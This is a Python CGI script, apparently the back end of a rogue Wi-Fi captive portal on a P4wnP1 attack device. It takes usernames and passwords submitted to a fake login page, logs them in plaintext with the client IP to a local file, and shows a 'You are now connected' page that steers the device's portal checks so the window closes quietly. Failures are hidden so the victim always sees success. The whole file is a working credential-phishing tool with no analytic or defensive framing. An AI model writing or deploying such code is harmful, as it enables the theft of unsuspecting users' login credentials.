#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, html, datetime, urllib.parse
from http import cookies
from datetime import timezone

def safe_print_headers(extra=None, status="200 OK"):
    sys.stdout.write(f"Status: {status}\r\n")
    sys.stdout.write("Content-Type: text/html; charset=utf-8\r\n")
    sys.stdout.write("Cache-Control: no-store, no-cache, must-revalidate, max-age=0\r\n")
    sys.stdout.write("Pragma: no-cache\r\n")
    sys.stdout.write("Expires: 0\r\n")
    if extra:
        for k, v in extra:
            sys.stdout.write(f"{k}: {v}\r\n")
    sys.stdout.write("\r\n")

def thank_you_html():
    return """<!doctype html>
<html><head>
  <meta charset="utf-8">
  <title>Connecting…</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{font-family:sans-serif;margin:2rem;text-align:center}
    .card{display:inline-block;padding:1rem 1.5rem;border:1px solid #ddd;border-radius:12px}
    h1{margin:0 0 .5rem 0;font-size:1.25rem}
  </style>
</head><body>
  <div class="card">
    <h1>Thank you!</h1>
    <p>You are now connected. This window will close automatically.</p>
  </div>
  <script>
    // Re-probe common CNAs, then try to close
    setTimeout(()=>{ try{ location.href='/generate_204'; }catch(e){} }, 150);
    setTimeout(()=>{ try{ location.href='http://captive.apple.com/hotspot-detect.html'; }catch(e){} }, 450);
    setTimeout(()=>{ try{ location.href='http://detectportal.firefox.com/canonical.html'; }catch(e){} }, 750);
    setTimeout(()=>{ try{ location.href='http://www.msftconnecttest.com/connecttest.txt'; }catch(e){} }, 1050);
    setTimeout(()=>{ try{ window.close(); }catch(e){} }, 2000);
  </script>
</body></html>"""

def main():
    # Read body safely (works for any Content-Type; we only try urlencoded parse)
    try:
        length = int(os.environ.get("CONTENT_LENGTH") or "0")
    except ValueError:
        length = 0
    raw = sys.stdin.read(length) if length > 0 else ""

    # Parse as urlencoded if it looks like it; otherwise, fall back gracefully
    username = password = ""
    try:
        if "=" in raw:
            parsed = urllib.parse.parse_qs(raw, keep_blank_values=True, strict_parsing=False)
            username = (parsed.get("username", [""])[0] or "").strip()
            password = (parsed.get("password", [""])[0] or "").strip()
        else:
            # some CNAs may GET /capture.py or send empty POST; that's okay
            pass
    except Exception:
        # never fail because of parsing
        pass

    # Prepare log line (timezone-aware UTC)
    now = datetime.datetime.now(timezone.utc).isoformat(timespec="seconds")
    remote = os.environ.get("REMOTE_ADDR", "-")
    host   = os.environ.get("HTTP_HOST", "-")
    uri    = os.environ.get("REQUEST_URI", "/capture.py")
    ua     = os.environ.get("HTTP_USER_AGENT", "-")
    safe_user = html.unescape(username)
    safe_pass = html.unescape(password)
    logline = f"{now} {remote} host={host} uri={uri} ua={ua} creds={safe_user}:{safe_pass}\n"

    # Write log (best effort)
    try:
        os.makedirs("/opt/p4wnp1/data", exist_ok=True)
        with open("/opt/p4wnp1/data/captive.log", "a", encoding="utf-8") as f:
            f.write(logline)
    except Exception:
        pass

    # Mark authed for *this IP* so Host-specific CNAs (Apple/Firefox/MS) stop looping
    try:
        os.makedirs("/opt/p4wnp1/data/auth", exist_ok=True)
        open(f"/opt/p4wnp1/data/auth/{remote}", "w").close()
    except Exception:
        pass

    # Cookie (best-effort; some CNAs won’t send it cross-host, IP-stamp covers that)
    ck = cookies.SimpleCookie()
    ck["P4WN_DONE"] = "1"
    ck["P4WN_DONE"]["path"] = "/"
    ck["P4WN_DONE"]["max-age"] = 86400
    ck["P4WN_DONE"]["httponly"] = True

    extra = [("Set-Cookie", ck.output(header="").strip())]
    safe_print_headers(extra, status="200 OK")
    sys.stdout.write(thank_you_html())

if __name__ == "__main__":
    try:
        main()
    except Exception:
        # absolutely never return 500; show a tiny success page anyway
        safe_print_headers(status="200 OK")
        sys.stdout.write("<!doctype html><title>OK</title>OK")
